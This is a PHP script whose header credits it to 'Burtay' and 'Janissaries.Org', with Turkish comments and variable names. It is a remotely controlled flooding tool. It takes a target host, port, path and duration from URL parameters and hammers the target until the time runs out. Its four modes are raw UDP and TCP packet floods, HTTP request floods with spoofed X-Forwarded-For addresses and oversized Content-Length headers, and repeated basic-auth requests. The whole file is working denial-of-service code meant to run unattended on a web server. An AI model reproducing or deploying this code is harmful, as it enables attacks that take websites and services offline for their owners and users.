<?php
/*
*	@Coded By Burtay
*	@Burtay.Org
*	@Janissaries.Org
*	@BuDoslama
*/

set_time_limit(0);
ignore_user_abort(TRUE);


// $tip	 		= $argv[1];
// $host	 		= $argv[2];
// $port 	 		= $argv[3];  
// $path 	 		= $argv[4];  
// $exec_time 	 	= $argv[5];  
	
$tip			= $_GET["tip"];
$host	 		= $_GET["host"];
$port	 		= $_GET["port"];
$path			= $_GET["path"];
$exec_time 	 	= $_GET["zaman"];

echo "Tip : ".$tip."<br>\n";	
echo "Host : ".$host."<br>\n";
echo "Port : ".$port."<br>\n";
echo "Path : ".$path."<br>\n";
echo "Zaman : ".$exec_time."<br>\n";
	
	if($host != null and $port != null and $exec_time != null)
	{
		$time = time();	
		$max_time = $time+$exec_time;
		
		if($tip == "udp")
		{					
			// $out	=	"";
			for($i=0;$i<65000;$i++)
			{
				$out .= 'JANI';
			}
			while(1)
			{
				if(time() > $max_time)
				{
					break;
				}            
				$fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 5);
				if($fp)
				{
					fwrite($fp, $out);
					fclose($fp);
				}
			}
		}
	
		elseif($tip == "http")
		{
			function wedatcan($host,$port,$path)
			{
				$ip_degistir = rand(50,254).'.'.rand(50,254).'.'.rand(50,254).'.'.rand(50,254);
				$saldir = fsockopen($host, $port , $errno, $errstr, 30);
				$gidenler .= "GET ".$path." HTTP/1.1\r\n";
				$gidenler .= "Host: ".$host."\r\n";
				$gidenler .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16\r\n";
				$gidenler .= "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpg,image/gif,*/*;q=0.5\r\n";
				$gidenler .= "Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\n";
				$gidenler .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
				$gidenler .= "Keep-Alive: 900\r\n";
				$gidenler .= "Proxy-Connection: keep-alive\r\n";
				$gidenler .= "Referer: http://".$host."/".$path."\r\n";
				$gidenler .= "Content-Type: application/x-www-form-urlencoded\r\n";
				$gidenler .= "Content-Length: " . mt_rand(100000000, 1000000000);
				$gidenler .= "X-Forwarded-For: ".$ip_degistir."\r\n";
				$gidenler .= "Via: CB-Prx\r\n";
				$gidenler .= "Connection: keep-alive\r\n\r\n";
				$saldiri_yolla = fwrite($saldir,$gidenler);
				fclose($saldir);
			}
			while(1)
			{
				if(time() > $max_time)
				{
					break;
				}  
				wedatcan($host,$port,$path);
			}
		}
	
		elseif($tip == "http_auth")
		{
			function curl($site,$username,$password)
			{
				$ip			=	rand(70,88).".".rand(70,120).".".rand(70,120).".".rand(70,120);
				$curl		=	curl_init();								//Curl Oturumu Baþladý
				curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);				//Sayfa Gösterimi Default Olarak Kapalý
				curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);				//Sayfa Gösterimi Default Olarak Kapalý
				curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,2);				//Sayfa Gösterimi Default Olarak Kapalý
				curl_setopt($curl,CURLOPT_URL,$site);						//Post edilecek adres belirlendi
				curl_setopt($curl,CURLOPT_REFERER,$site);						//Post edilecek adres belirlendi
				//curl_setopt($curl,CURLOPT_HTTPHEADER, array('X_FORWARDED_FOR: '.$ip,'Keep-Alive: 900','User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16','Proxy-Connection: keep-alive','Content-Length: ' . mt_rand(100000000, 1000000000),'Via: CB-Prx','Connection: keep-alive');						//Post etme iþlemi aktifleþtirildi
				curl_setopt($curl,CURLOPT_USERPWD,$username.":".$password);						//Post etme iþlemi aktifleþtirildi				
				curl_setopt($curl,CURLOPT_FOLLOWLOCATION,TRUE);						//Post etme iþlemi aktifleþtirildi;				//Post edilecek Veri belirlendi
				$calis		=	curl_exec($curl);							//POST Ýþlemi gerçekleþti
				return $calis;
			}
			while(1)
			{
				if(time() > $max_time)
				{
					break;
				}  
				curl($host,$port,$path);
			}
		}
		
		elseif($tip == "tcp")
		{		
			$out	=	"";
			for($i=0;$i<65000;$i++)
			{
				$out .= 'JANI';
			}
			while(1)
			{
				if(time() > $max_time)
				{
					break;
				}            
				$fp = fsockopen($host, $port, $errno, $errstr, 5);
				if($fp)
				{
					fwrite($fp, $out);
					fclose($fp);
				}
			}		
		}
	
	}
?>